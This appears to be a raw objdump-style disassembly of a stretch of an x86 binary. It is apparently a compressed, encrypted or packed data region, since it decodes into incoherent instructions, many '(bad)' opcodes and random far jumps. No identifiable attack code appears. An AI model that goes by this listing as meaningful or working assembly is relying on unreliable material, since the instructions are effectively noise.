  425386:	in     al,dx
  425387:	jp     0x425345
  425389:	in     al,dx
  42538a:	xchg   ebp,eax
  42538b:	pop    ebp
  42538c:	jbe    0x4253e3
  42538e:	push   ecx
  42538f:	dec    eax
  425390:	and    edx,DWORD PTR gs:[ebp-0x186c8d9e]
  425397:	cwde   
  425398:	loop   0x42538e
  42539a:	ret    0x832f
  42539d:	pop    ds
  42539e:	inc    ebp
  42539f:	inc    ebx
  4253a0:	lock inc ecx
  4253a2:	jl     0x425421
  4253a4:	xchg   DWORD PTR [edi-0x31e88230],esp
  4253aa:	inc    eax
  4253ab:	sti    
  4253ac:	sbb    eax,0xe64c444d
  4253b1:	out    dx,al
  4253b2:	ret    
  4253b3:	xchg   ebx,eax
  4253b4:	mov    WORD PTR [edx-0x77],gs
  4253b7:	jp     0x42538c
  4253b9:	outs   dx,BYTE PTR ds:[esi]
  4253ba:	mov    ebp,0x7939b06d
  4253bf:	pop    edx
  4253c0:	(bad)  [edi-0x58]
  4253c3:	ret    0xca1e
  4253c6:	data16 adc bh,al
  4253c9:	aam    0x5f
  4253cb:	mov    bh,0x1
  4253cd:	ds jbe 0x425407
  4253d0:	aam    0x1f
  4253d2:	xchg   esp,eax
  4253d3:	mov    eax,ds:0x22f4e1f6
  4253d8:	mov    ebx,0x7d96e378
  4253dd:	sub    dl,BYTE PTR [edx]
  4253df:	sub    eax,0x97560ec
  4253e4:	push   ds
  4253e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4253e6:	cmp    bh,ah
  4253e8:	dec    eax
  4253e9:	xor    ecx,DWORD PTR [esi+eax*4]
  4253ec:	clc    
  4253ed:	add    edi,edi
  4253ef:	xor    DWORD PTR [eax+0x4b4b0906],esp
  4253f5:	sbb    eax,0xf1309fa7
  4253fa:	stc    
  4253fb:	mov    cl,0x12
  4253fd:	leave  
  4253fe:	dec    esi
  4253ff:	fs (bad) 
  425401:	pushf  
  425402:	push   cs
  425403:	pop    ss
  425404:	pop    es
  425405:	and    eax,0xd281411c
  42540a:	bound  ebx,QWORD PTR [ebp-0x70be4092]
  425410:	xor    dh,ch
  425412:	mov    ecx,0x14b30213
  425417:	add    al,0x51
  425419:	xor    BYTE PTR [edx-0x5f],dh
  42541c:	push   ecx
  42541d:	nop
  42541e:	shl    DWORD PTR [edx+0x67],1
  425421:	sub    ah,BYTE PTR [ecx+0x3392013e]
  425427:	push   edx
  425428:	retf   
  425429:	and    eax,0x449886b1
  42542e:	(bad)  
  42542f:	xchg   edx,eax
  425430:	and    al,0x5a
  425432:	scas   eax,DWORD PTR es:[edi]
  425433:	(bad)  
  425434:	mov    ecx,0xfdff2270
  425439:	mov    bh,0x4e
  42543b:	shl    edi,0xa4
  42543e:	jmp    0x425401
  425440:	mov    eax,ds:0x3e
	...
  4254b1:	add    BYTE PTR [eax],al
  4254b3:	add    al,ah
  4254b5:	outs   dx,DWORD PTR ds:[esi]
  4254b6:	xchg   esi,eax
  4254b7:	inc    edx
  4254b8:	lahf   
  4254b9:	sti    
  4254ba:	hlt    
  4254bb:	out    dx,eax
  4254bc:	cmp    dh,BYTE PTR [ebx]
  4254be:	loop   0x42544b
  4254c0:	lods   al,BYTE PTR ds:[esi]
  4254c1:	cli    
  4254c2:	inc    eax
  4254c3:	(bad)  
  4254c4:	mov    dh,0x8d
  4254c6:	add    DWORD PTR [eax],eax
  4254c8:	test   BYTE PTR [eax],0x0
  4254cb:	add    BYTE PTR [esp+eiz*2-0x3c],bh
  4254cf:	ret    
  4254d0:	call   0xadd3:0x92db0c50
  4254d7:	sahf   
  4254d8:	sbb    ah,dh
  4254da:	xor    esi,edi
  4254dc:	mov    esp,0x26b119cf
  4254e1:	adc    esp,DWORD PTR [edx+eax*1]
  4254e4:	aam    0x72
  4254e6:	push   cs
  4254e7:	into   
  4254e8:	or     BYTE PTR [edx],dl
  4254ea:	ret    0xc535
  4254ed:	push   ebp
  4254ee:	dec    eax
  4254ef:	es dec ebx
  4254f1:	adc    dl,BYTE PTR [ebp+0x45]
  4254f4:	pusha  
  4254f5:	stos   BYTE PTR es:[edi],al
  4254f6:	adc    dh,BYTE PTR [esi]
  4254f8:	ss leave 
  4254fa:	popf   
  4254fb:	mov    bh,BYTE PTR [eax]
  4254fd:	jno    0x425514
  4254ff:	xor    edx,edx
  425501:	mov    dl,0x93
  425503:	jns    0x425537
  425505:	gs mov al,0x2b
  425508:	sar    BYTE PTR [esi-0x25],cl
  42550b:	mov    edi,0xcd275248
  425510:	rcl    DWORD PTR [esi+esi*1],1
  425513:	adc    eax,0x1b924625
  425518:	sbb    BYTE PTR [eax+0x2e],0xb8
  42551c:	cwde   
  42551d:	ret    
  42551e:	fs jp  0x425528
  425521:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425522:	cmp    ebp,DWORD PTR [edi-0x23]
  425525:	mov    al,0x6d
  425527:	lods   al,BYTE PTR ds:[esi]
  425528:	out    dx,al
  425529:	push   edi
  42552a:	inc    edi
  42552b:	inc    eax
  42552c:	int3   
  42552d:	push   ebp
  42552e:	mov    BYTE PTR ds:0x92b3acc7,al
  425534:	into   
  425535:	add    edi,DWORD PTR ds:0x34c11337
  42553b:	inc    eax
  42553c:	icebp  
  42553d:	pop    esp
  42553e:	stos   DWORD PTR es:[edi],eax
  42553f:	cmp    ebx,DWORD PTR [edx+0x78]
  425542:	ret    0xced8
  425545:	fisub  WORD PTR [esi-0x21095770]
  42554b:	rcr    cl,0xb4
  42554e:	or     al,0x59
  425550:	lods   eax,DWORD PTR ds:[esi]
  425551:	aam    0x18
  425553:	dec    esi
  425554:	bnd jmp 0xbb16a68f
  42555a:	idiv   DWORD PTR [esi-0x852df66]
  425560:	out    dx,al
  425561:	sub    BYTE PTR [ebx-0x2b8bbef6],bh
  425567:	(bad)  
  425568:	retf   0xa7b3
  42556b:	cmp    al,0xaa
  42556d:	int    0xec
  42556f:	dec    esi
  425570:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425571:	int3   
  425572:	sbb    DWORD PTR [esi-0x7fabeea8],eax
  425578:	dec    ecx
  425579:	imul   ecx,esi,0x51
  42557c:	stos   BYTE PTR es:[edi],al
  42557d:	sti    
  42557e:	jecxz  0x425540
  425580:	xor    al,0xfd
  425582:	add    DWORD PTR [ecx],edx
  425584:	clc    
  425585:	xlat   BYTE PTR ds:[ebx]
  425586:	inc    esp
  425587:	shr    BYTE PTR [edx],1
  425589:	adc    ebx,DWORD PTR [ebp+0x5e]
  42558c:	mov    bh,bh
  42558e:	sbb    BYTE PTR [eax+0x67],dl
  425591:	cmc    
  425592:	adc    BYTE PTR [eiz*4+0x314aa2c1],dl
  425599:	dec    eax
  42559a:	out    dx,eax
  42559b:	int3   
  42559c:	xlat   BYTE PTR ds:[ebx]
  42559d:	rcr    BYTE PTR [edx+edi*2],cl
  4255a0:	cdq    
  4255a1:	dec    ebp
  4255a2:	jnp    0x4255cb
  4255a4:	xlat   BYTE PTR ds:[ebx]
  4255a5:	fstp   QWORD PTR [esi+0x7b679e3d]
  4255ab:	retf   
  4255ac:	xor    edi,DWORD PTR [eax]
  4255ae:	or     ah,BYTE PTR [edx+0x1fe808a]
  4255b4:	mov    eax,DWORD PTR [edx]
  4255b6:	lahf   
  4255b7:	sub    eax,0xd7b4fb97
  4255bc:	jge    0x4255d8
  4255be:	jl     0x425582
  4255c0:	imul   edi,DWORD PTR [esi+0x0],0x0
	...
  425634:	mov    esp,0xfefffc92
  425639:	(bad)  
  42563a:	mov    edi,0x14500ad3
  42563f:	into   
  425640:	inc    edx
  425641:	cmp    al,0x72
  425643:	call   0xf6:0x18eac
  42564a:	add    BYTE PTR [eax],al
  42564c:	push   ecx
  42564d:	cmp    edx,DWORD PTR [edi-0x5]
  425650:	mov    bh,0xa5
  425652:	inc    edx
  425653:	or     al,0x72
  425655:	inc    ebp
  425656:	inc    esi
  425657:	sbb    edx,esi
  425659:	retf   0x9a2c
  42565c:	sub    eax,0x280d1b49
  425661:	xor    ecx,DWORD PTR [eax-0x6c]
  425664:	loopne 0x42564b
  425666:	leave  
  425667:	aad    0x77
  425669:	xchg   BYTE PTR [di],ah
  42566c:	or     BYTE PTR [eax+0x9],dl
  42566f:	and    al,0x16
  425671:	popf   
  425672:	js     0x425621
  425674:	jge    0x4256f5
  425676:	adc    BYTE PTR [eax-0x70a6322e],bl
  42567c:	je     0x4256b3
  42567e:	aaa    
  42567f:	stc    
  425680:	pop    esp
  425681:	mov    edi,0xb6a8dc4a
  425686:	pop    edx
  425687:	push   ebp
  425688:	cmp    eax,0x87f12c32
  42568d:	jl     0x42567a
  42568f:	cwde   
  425690:	mov    eax,0x13f48468
  425695:	xor    eax,0x8286e21c
  42569a:	and    eax,0xc2d999b6
  42569f:	push   cs
  4256a0:	xchg   edx,eax
  4256a1:	inc    ecx
  4256a2:	cmp    al,0x4f
  4256a4:	(bad)  
  4256a5:	sbb    BYTE PTR [ecx-0x5a],bh
  4256a8:	mov    ebx,esi
  4256aa:	xor    DWORD PTR [edi-0x3a68d2f9],ebp
  4256b0:	call   0x5f453d6b
  4256b5:	popa   
  4256b6:	mov    ebp,ebp
  4256b8:	int    0x2c
  4256ba:	out    0xa2,al
  4256bc:	pxor   mm0,mm0
  4256bf:	test   BYTE PTR [ecx+edi*1+0xe],0xe1
  4256c4:	leave  
  4256c5:	cs push ds
  4256c7:	inc    edi
  4256c8:	mov    eax,0x84d839d6
  4256cd:	scas   al,BYTE PTR es:[edi]
  4256ce:	sbb    eax,0xda6fc683
  4256d3:	mov    ds:0x63820272,eax
  4256d8:	mov    edx,0x849a2141
  4256dd:	jo     0x4256ec
  4256df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4256e0:	dec    ebx
  4256e1:	pop    eax
  4256e2:	xchg   ebx,eax
  4256e3:	int    0x6f
  4256e5:	dec    eax
  4256e6:	cs and eax,0xa5702608
  4256ec:	xchg   edi,eax
  4256ed:	test   DWORD PTR [edi+0x7123bd84],ebp
  4256f3:	sbb    ah,BYTE PTR [edx+0x1c412ace]
  4256f9:	inc    edi
  4256fa:	out    dx,al
  4256fb:	push   edi
  4256fc:	lds    eax,FWORD PTR [edx+esi*1]
  4256ff:	jmp    0xef2e:0xbb9fc49f
  425706:	pusha  
  425707:	out    dx,eax
  425708:	shl    BYTE PTR [edi+0x24bf68b3],1
  42570e:	out    dx,eax
  42570f:	cs popa 
  425711:	scas   eax,DWORD PTR es:[edi]
  425712:	sub    BYTE PTR ds:0xf9c327b0,ah
  425718:	mov    dl,0xa4
  42571a:	fst    QWORD PTR [ecx+edi*4]
  42571d:	out    dx,eax
  42571e:	jno    0x425768
  425720:	jmp    0x42570e
  425722:	mov    DWORD PTR [esi+edi*8-0x16],eax
  425726:	pop    esp
  425727:	stos   DWORD PTR es:[edi],eax
  425728:	sti    
  425729:	sub    dl,BYTE PTR [ebx]
  42572b:	and    al,0xb7
  42572d:	push   edx
  42572e:	sar    BYTE PTR [ebx-0x45],0x71
  425732:	push   0x9394374a
  425737:	or     dl,BYTE PTR [ecx+0x1bc90d23]
  42573d:	cs jp  0x42571f
  425740:	or     eax,0xe7
	...
  4257b1:	add    BYTE PTR [eax],al
  4257b3:	add    BYTE PTR [edx],ah
  4257b5:	pop    eax
  4257b6:	test   bh,ch
  4257b8:	(bad)  
  4257b9:	jmp    FWORD PTR [ebx-0x23]
  4257bc:	jp     0x425751
  4257be:	cmp    edx,esp
  4257c0:	sub    dh,BYTE PTR [edi+edx*4+0x58]
  4257c4:	mov    ds:0xf600018f,al
  4257c9:	add    BYTE PTR [eax],al
  4257cb:	add    BYTE PTR [esi-0xc33f3f5],cl
  4257d1:	hlt    
  4257d2:	dec    eax
  4257d3:	sahf   
  4257d4:	push   eax
  4257d5:	xchg   esi,eax
  4257d6:	jmp    0x38ba:0xdd82b37d
  4257dd:	loopne 0x42578f
  4257df:	arpl   WORD PTR [ecx+0x7e],ax
  4257e2:	cdq    
  4257e3:	push   ebp
  4257e4:	pop    eax
  4257e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4257e6:	or     ch,bl
  4257e8:	cld    
  4257e9:	outs   dx,BYTE PTR ds:[esi]
  4257ea:	add    eax,0x669b03b
  4257ef:	push   ecx
  4257f0:	jle    0x4257a8
  4257f2:	jae    0x425798
  4257f4:	mov    DWORD PTR [esi],edx
  4257f6:	mov    cl,0x5a
  4257f8:	fs add al,0xd2
  4257fb:	xchg   edi,eax
  4257fc:	pop    edi
  4257fd:	jns    0x4257d0
  4257ff:	(bad)  
  425801:	imul   edi,DWORD PTR [esi],0xffffffca
  425804:	mov    ah,0x2b
  425806:	sub    al,0xc6
  425808:	mov    ds:0x783db182,eax
  42580d:	leave  
  42580e:	xchg   ecx,eax
  42580f:	scas   eax,DWORD PTR es:[edi]
  425810:	and    DWORD PTR [edx+0x2cec8f31],ebx
  425816:	xor    bl,dl
  425818:	push   esp
  425819:	add    esp,ebx
  42581b:	xchg   edi,eax
  42581c:	or     eax,DWORD PTR [eax]
  42581e:	or     al,0x48
  425820:	call   0x439fa0ea
  425825:	and    ebx,eax
  425827:	in     al,dx
  425828:	jle    0x42586e
  42582a:	jl     0x4257f7
  42582c:	fsubp  st(2),st
  42582e:	xor    ah,BYTE PTR [eax-0x10]
  425831:	cmp    DWORD PTR [ebp+0x55],edi
  425834:	cdq    
  425835:	push   ebp
  425836:	hlt    
  425837:	lock lahf 
  425839:	icebp  
  42583a:	cmp    edx,DWORD PTR [ecx]
  42583c:	jne    0x425837
  42583e:	mov    bh,0x84
  425840:	xchg   ebp,eax
  425841:	or     esp,DWORD PTR [ebx+0x537593fe]
  425847:	add    eax,0x94c9727f
  42584c:	mov    BYTE PTR [edx-0x51da923f],ch
  425852:	shl    DWORD PTR [ebp-0x3f],cl
  425855:	xor    eax,0x3a5a29a4
  42585a:	test   eax,0xd4f79711
  42585f:	sub    al,0x23
  425861:	into   
  425862:	dec    edx
  425863:	outs   dx,BYTE PTR ds:[esi]
  425864:	lds    ebp,FWORD PTR [ecx-0xe]
  425867:	fld    TBYTE PTR [esi-0x340e5da1]
  42586d:	mov    edx,0x3937b76a
  425872:	push   esp
  425873:	dec    ebx
  425874:	aad    0x2e
  425876:	and    eax,0x8cf5c170
  42587b:	sub    ebx,DWORD PTR [ebx]
  42587d:	xchg   edi,eax
  42587e:	int    0xfe
  425880:	sub    ch,BYTE PTR [ebx+0x2514a0a5]
  425886:	mov    dl,0x43
  425888:	sbb    DWORD PTR [edi+0x3d],eax
  42588b:	(bad)  
  42588c:	sahf   
  42588d:	push   edx
  42588e:	jecxz  0x425843
  425890:	mov    ds,WORD PTR [ebx+0x588e5893]
  425896:	sbb    al,0x6c
  425898:	aad    0xc9
  42589a:	shl    BYTE PTR [esi],cl
  42589c:	mov    dh,0x21
  42589e:	sbb    BYTE PTR [ecx],ah
  4258a0:	jle    0x42590c
  4258a2:	popf   
  4258a3:	xchg   esi,eax
  4258a4:	int3   
  4258a5:	(bad)  
  4258a7:	adc    ebp,DWORD PTR [ecx]
  4258a9:	aaa    
  4258aa:	adc    DWORD PTR [ebx+eiz*4+0x52],esi
  4258ae:	pop    ebp
  4258af:	lds    ecx,FWORD PTR [eax]
  4258b1:	lods   al,BYTE PTR ds:[esi]
  4258b2:	pop    eax
  4258b3:	jo     0x42586c
  4258b5:	mov    ds:0x56cb4ce1,al
  4258ba:	and    DWORD PTR [ebp+0x2a51bdb3],esi
  4258c0:	jo     0x425932
	...
  425932:	add    BYTE PTR [eax],al
  425934:	imul   ebx,DWORD PTR [eax],0x63
  425937:	push   0x73
  425939:	jnp    0x4259a6
  42593b:	sbb    esp,esp
  42593d:	xchg   edi,eax
  42593e:	sub    DWORD PTR [ecx],edi
  425940:	outs   dx,DWORD PTR ds:[esi]
  425941:	xor    BYTE PTR [ecx+eiz*1-0x68],ah
  425945:	nop
  425946:	add    DWORD PTR [eax],eax
  425948:	test   BYTE PTR [eax],0x0
  42594b:	add    al,dh
  42594d:	push   ebp
  42594e:	sub    cl,bh
  425950:	jne    0x4258d6
  425952:	rcr    DWORD PTR [edi+0x6a],1
  425955:	stos   DWORD PTR es:[edi],eax
  425956:	xor    edi,ebp
  425958:	or     DWORD PTR [edi+0x1d],edx
  42595b:	push   0x41
  42595d:	push   ebx
  42595e:	add    ch,BYTE PTR [edi-0x70d9f216]
  425964:	inc    edi
  425965:	mov    BYTE PTR [edi-0x5f],0xc9
  425969:	das    
  42596a:	xchg   esp,eax
  42596b:	xchg   ebx,eax
  42596c:	pop    ds
  42596d:	je     0x4259e7
  42596f:	call   DWORD PTR [ecx]
  425971:	and    al,0xbc
  425973:	cmp    dh,BYTE PTR [ebx+edi*4+0x31]
  425977:	test   bh,dl
  425979:	popf   
  42597a:	pop    es
  42597b:	outs   dx,BYTE PTR ds:[esi]
  42597c:	ret    0x50d5
  42597f:	mov    DWORD PTR [esi-0xdbb30a6],esp
  425985:	jp     0x4259f0
  425987:	jb     0x425998
  425989:	push   eax
  42598a:	inc    esi
  42598b:	ja     0x42596c
  42598d:	mov    esp,0x371b1eb0
  425992:	enter  0xcfc5,0x83
  425996:	xor    dh,BYTE PTR [ebx-0x23e7a80]
  42599c:	cmp    esp,DWORD PTR [eax]
  42599e:	xor    ebp,DWORD PTR [eax+edx*4]
  4259a1:	mov    dh,0x20
  4259a3:	push   0x523baf04
  4259a8:	dec    esi
  4259a9:	dec    edi
  4259aa:	mov    edi,ss
  4259ac:	(bad)  
  4259ad:	loopne 0x425934
  4259af:	scas   al,BYTE PTR es:[edi]
  4259b0:	sbb    BYTE PTR [ecx],ch
  4259b2:	sbb    ecx,DWORD PTR [esi]
  4259b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4259b5:	fmul   DWORD PTR [edx+ebx*1+0x4]
  4259b9:	sbb    DWORD PTR [ecx],edx
  4259bb:	lds    edx,FWORD PTR [ecx+0x704e0846]
  4259c1:	scas   al,BYTE PTR es:[edi]
  4259c2:	xchg   esi,eax
  4259c3:	test   edx,eax
  4259c5:	sbb    al,0xb9
  4259c7:	outs   dx,BYTE PTR ds:[esi]
  4259c8:	jge    0x425a27
  4259ca:	sbb    esp,0x2d54f57a
  4259d0:	mov    es,WORD PTR [edi+esi*2-0x2466872a]
  4259d7:	push   0x30cf4e1d
  4259dc:	outs   dx,BYTE PTR ds:[esi]
  4259dd:	sbb    dl,BYTE PTR [edi]
  4259df:	add    ebp,ebp
  4259e1:	sub    dh,al
  4259e3:	cmp    esi,ecx
  4259e5:	push   ebx
  4259e6:	push   eax
  4259e7:	outs   dx,DWORD PTR ds:[esi]
  4259e8:	sub    ecx,DWORD PTR [ebp-0x31]
  4259eb:	test   ebx,ebp
  4259ed:	or     BYTE PTR [eax+0x1a],bl
  4259f0:	jnp    0x4259ca
  4259f2:	rol    DWORD PTR [edx+0x5e8c3466],0x17
  4259f9:	aaa    
  4259fa:	mov    eax,DWORD PTR [ebp-0x32]
  4259fd:	mov    al,ds:0x3591c619
  425a02:	addr16 inc ebp
  425a04:	push   0xffffffcf
  425a06:	inc    esp
  425a07:	mov    dl,0xe9
  425a09:	inc    BYTE PTR [edi-0x64856cb7]
  425a0f:	mov    al,ds:0x4274bbca
  425a14:	and    esi,DWORD PTR [eax+0x2a286c25]
  425a1a:	arpl   WORD PTR [edx-0x10],dx
  425a1d:	pop    ebx
  425a1e:	push   ds
  425a1f:	inc    esp
  425a20:	mov    al,ds:0x3aaafe76
  425a25:	and    ecx,DWORD PTR [ecx]
  425a27:	and    DWORD PTR [eax],esp
  425a29:	daa    
  425a2a:	mov    edi,DWORD PTR [edx]
  425a2c:	hlt    
  425a2d:	or     ebx,DWORD PTR [ebx-0x20b0e0a3]
  425a33:	sar    BYTE PTR [ebp+eiz*4-0x2a],cl
  425a37:	push   edi
  425a38:	repnz lods eax,DWORD PTR ds:[esi]
  425a3a:	pop    esp
  425a3b:	adc    al,0x88
  425a3d:	fcmovu st,st(3)
  425a3f:	test   al,0xc3
  425a41:	jns    0x425a43
	...
  425ab3:	add    BYTE PTR [esi],al
  425ab5:	aas    
  425ab6:	or     eax,0xb6bb3db9
  425abb:	mov    edi,0xa9fcb6ec
  425ac0:	mov    dh,0x96
  425ac2:	and    DWORD PTR [edx-0x72],ebx
  425ac5:	xchg   ecx,eax
  425ac6:	add    DWORD PTR [eax],eax
  425ac8:	test   BYTE PTR [eax],0x0
  425acb:	add    BYTE PTR [ebx+0x2299952b],dl
  425ad1:	pop    ss
  425ad2:	and    BYTE PTR [eax],dl
  425ad4:	inc    esp
  425ad5:	sub    cl,BYTE PTR [esi+ebp*4+0x40]
  425ad9:	sti    
  425ada:	cwde   
  425adb:	test   BYTE PTR [esi-0x3adac81f],dl
  425ae1:	add    ebp,0x60152b
  425ae7:	dec    ecx
  425ae8:	retf   
  425ae9:	xchg   esi,eax
  425aea:	(bad)  
  425aeb:	scas   al,BYTE PTR es:[edi]
  425aec:	jae    0x425b30
  425aee:	test   al,0x3f
  425af0:	dec    ecx
  425af1:	adc    eax,0x5c885e17
  425af6:	inc    esi
  425af7:	jo     0x425afc
  425af9:	inc    ecx
  425afa:	mov    BYTE PTR [edi-0x5bf653fe],al
  425b00:	inc    eax
  425b01:	sub    al,0x8
  425b03:	in     al,dx
  425b04:	ficom  WORD PTR [ecx+0x5ca29be4]
  425b0a:	test   DWORD PTR [eax+0x3],eax
  425b0d:	mov    edx,0x3a3d63ca
  425b12:	ret    0xe201
  425b15:	push   es
  425b16:	repnz xchg esp,eax
  425b18:	dec    edx
  425b19:	push   0x5989bb14
  425b1e:	out    0x6f,eax
  425b20:	cmp    al,0x13
  425b22:	add    BYTE PTR [esi+ecx*4],bl
  425b25:	pop    ebx
  425b26:	sahf   
  425b27:	in     al,0x30
  425b29:	xchg   ebp,eax
  425b2a:	pop    ecx
  425b2b:	or     DWORD PTR [edx],esi
  425b2d:	mov    ecx,0x8950a33c
  425b32:	cld    
  425b33:	fwait
  425b34:	out    0x8a,al
  425b36:	sub    eax,0x9a1c3bc6
  425b3b:	adc    al,0xa3
  425b3d:	jno    0x425b8a
  425b3f:	mov    gs,WORD PTR [ecx-0x4a]
  425b42:	mov    BYTE PTR [eax+ebx*4],dh
  425b45:	and    esp,DWORD PTR [ebp-0x4c798e00]
  425b4b:	lock aad 0x3b
  425b4e:	add    ecx,DWORD PTR [ecx+0x77]
  425b51:	fisttp WORD PTR [ebx-0x248321e1]
  425b57:	and    ecx,0x9ecdb208
  425b5d:	test   eax,0xc550260c
  425b62:	outs   dx,DWORD PTR ds:[esi]
  425b63:	iret   
  425b64:	icebp  
  425b65:	imul   eax,DWORD PTR [edx+0x35],0x8e33ce2b
  425b6c:	cld    
  425b6d:	jg     0x425b2e
  425b6f:	ins    DWORD PTR es:[edi],dx
  425b70:	(bad)  
  425b71:	arpl   WORD PTR [edx+0x40850857],sp
  425b77:	dec    edi
  425b78:	inc    ecx
  425b79:	mov    eax,ds:0x77d8a92c
  425b7e:	sub    al,0xce
  425b80:	repz inc esp
  425b82:	scas   eax,DWORD PTR es:[edi]
  425b83:	stos   DWORD PTR es:[edi],eax
  425b84:	clc    
  425b85:	xor    BYTE PTR [ecx+0x34aeb728],0x79
  425b8c:	dec    BYTE PTR [esi]
  425b8e:	mov    dl,0xf3
  425b90:	in     eax,dx
  425b91:	jmp    0x2083e40d
  425b96:	mov    ebp,0x1b55539d
  425b9b:	sub    al,0x56
  425b9d:	cmp    ch,bl
  425b9f:	and    DWORD PTR [ebx+0x7f],ebx
  425ba2:	mov    bl,0xbb
  425ba4:	or     al,0x7e
  425ba6:	pop    eax
  425ba7:	lock fcomp DWORD PTR [edx+0x1c]
  425bab:	fwait
  425bac:	stos   BYTE PTR es:[edi],al
  425bad:	lahf   
  425bae:	std    
  425baf:	pop    ebp
  425bb0:	jecxz  0x425bd6
  425bb2:	jno    0x425b45
  425bb4:	jne    0x425b58
  425bb6:	sbb    DWORD PTR [edx],ebx
  425bb8:	cmp    dl,BYTE PTR [ecx+0x7be5e217]
  425bbe:	push   0x8e1ad7
	...
  425c33:	add    BYTE PTR [edx+ebx*8-0x4c],ch
  425c37:	push   0xffffffb6
  425c39:	outs   dx,BYTE PTR ds:[esi]
  425c3a:	(bad)  
  425c3b:	fdivp  st(2),st
  425c3d:	sub    ch,cl
  425c3f:	call   0x9284:0x3f7b4062
  425c46:	add    DWORD PTR [eax],eax
  425c48:	test   BYTE PTR [eax],0x0
  425c4b:	add    BYTE PTR [eax-0x49],cl
  425c4e:	or     cl,BYTE PTR [edx+0x12]
  425c51:	test   al,0x44
  425c53:	inc    esp
  425c54:	mov    dl,ah
  425c56:	cmc    
  425c57:	pop    esp
  425c58:	cmp    ch,bh
  425c5a:	push   eax
  425c5b:	shl    DWORD PTR [ebx],cl
  425c5d:	xor    al,0xf1
  425c5f:	aam    0x75
  425c61:	lock scas eax,DWORD PTR es:[edi]
  425c63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425c64:	inc    edi
  425c66:	mov    ch,0x53
  425c68:	retf   
  425c69:	stc    
  425c6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425c6b:	or     al,ah
  425c6d:	out    0x35,al
  425c6f:	(bad)  
  425c70:	aam    0xe6
  425c72:	mov    WORD PTR [edi+0xabd485d],ds
  425c78:	stc    
  425c79:	push   ecx
  425c7a:	stc    
  425c7b:	jo     0x425cfa
  425c7d:	push   0xfffffffa
  425c7f:	jno    0x425c92
  425c81:	jg     0x425c67
  425c83:	adc    eax,0x1396488f
  425c88:	add    al,0x8a
  425c8a:	adc    bl,BYTE PTR [eax+0x50]
  425c8d:	retf   0x4c73
  425c90:	sub    BYTE PTR [ecx-0x6baffa9d],ah
  425c96:	fwait
  425c97:	sbb    al,0x18
  425c99:	sbb    esi,edx
  425c9b:	bnd jp 0x425d15
  425c9e:	mov    bh,BYTE PTR [ebx+0x16]
  425ca1:	pop    edi
  425ca2:	mov    ds:0xf29d02a6,eax
  425ca7:	ret    0xbe48
  425caa:	xchg   ebp,eax
  425cab:	pop    ebp
  425cac:	and    al,0xd8
  425cae:	xor    al,0x18
  425cb0:	jle    0x425c7b
  425cb2:	jne    0x425cf5
  425cb4:	sbb    BYTE PTR [edx-0xa],0x10
  425cb8:	pop    es
  425cb9:	pop    edx
  425cba:	lds    ebp,FWORD PTR [edi-0x5e488cb8]
  425cc0:	popa   
  425cc1:	scas   eax,DWORD PTR es:[edi]
  425cc2:	or     dh,BYTE PTR [eax]
  425cc4:	sahf   
  425cc5:	jge    0x425c93
  425cc7:	in     eax,dx
  425cc8:	dec    ebp
  425cc9:	repz jbe 0x425d05
  425ccc:	in     al,dx
  425ccd:	xchg   ebx,eax
  425cce:	addr16 repz push edx
  425cd1:	(bad)  
  425cd2:	jmp    0x425c77
  425cd4:	dec    esp
  425cd5:	imul   BYTE PTR [ebp-0x147d41ff]
  425cdb:	pushf  
  425cdc:	leave  
  425cdd:	lea    edx,[edi+0x523b8bc1]
  425ce3:	cmp    DWORD PTR [ebx-0x64a9d59],0x33
  425cea:	xrelease xchg BYTE PTR ds:[edx+0x6a1346d0],bh
  425cf2:	rcr    ch,0x65
  425cf5:	outs   dx,BYTE PTR ds:[esi]
  425cf6:	dec    esp
  425cf7:	std    
  425cf8:	adc    ecx,edi
  425cfa:	and    edi,esi
  425cfc:	cli    
  425cfd:	loopne 0x425d26
  425cff:	retf   0xc8fc
  425d02:	test   DWORD PTR [esi-0x19],esi
  425d05:	xchg   esp,eax
  425d06:	jo     0x425cba
  425d08:	dec    ecx
  425d09:	fisttp DWORD PTR [ecx+ebx*8]
  425d0c:	dec    ecx
  425d0d:	fwait
  425d0e:	mov    al,ds:0x7766e562
  425d13:	into   
  425d14:	test   al,0xfe
  425d16:	in     eax,dx
  425d17:	pushf  
  425d18:	mov    ah,0x34
  425d1a:	test   DWORD PTR [esi],eax
  425d1c:	push   0xfa79a70b
  425d21:	sub    ah,BYTE PTR [edx+eiz*1-0x5b5a59]
  425d28:	out    0x7f,al
  425d2a:	jmp    0x425d18
  425d2c:	test   eax,0xa3ac8c49
  425d31:	mov    ebp,0xa78cb4b6
  425d36:	loopne 0x425cc5
  425d38:	out    0xc,al
  425d3a:	mov    ah,0x7a
  425d3c:	pop    edi
  425d3d:	ds scas al,BYTE PTR es:[edi]
  425d3f:	ins    BYTE PTR es:[edi],dx
  425d40:	push   edi
  425d41:	sbb    eax,0x0
	...
  425db2:	add    BYTE PTR [eax],al
  425db4:	cmp    eax,0xf361d20c
  425db9:	(bad)  
  425dba:	mov    edi,0xa480315c
  425dbf:	in     al,dx
  425dc0:	push   ebp
  425dc1:	pop    es
  425dc2:	ja     0x425d7e
  425dc4:	jp     0x425d59
  425dc6:	add    DWORD PTR [eax],eax
  425dc8:	test   BYTE PTR [eax],0x0
  425dcb:	add    BYTE PTR [ecx+0x63],bh
  425dce:	dec    esp
  425dcf:	sbb    edx,DWORD PTR [edx-0x3e]
  425dd2:	mov    bh,0xfa
  425dd4:	int3   
  425dd5:	je     0x425df2
  425dd7:	aam    0x88
  425dd9:	adc    ah,BYTE PTR [edx+ecx*4]
  425ddc:	imul   eax,DWORD PTR [edi+0x10],0xffffffaf
  425de0:	inc    ebx
  425de2:	scas   eax,DWORD PTR es:[edi]
  425de3:	fsubr  QWORD PTR [ecx+0x7b]
  425de6:	out    0x86,al
  425de8:	jge    0x425dbb
  425dea:	pmullw mm6,mm6
  425ded:	pop    ebp
  425dee:	pop    ecx
  425def:	push   es
  425df0:	mov    edx,0x94af1f1b
  425df5:	sbb    ebp,DWORD PTR [ebx]
  425df7:	(bad)  
  425df9:	add    eax,0xac4ae69f
  425dfe:	xchg   ecx,eax
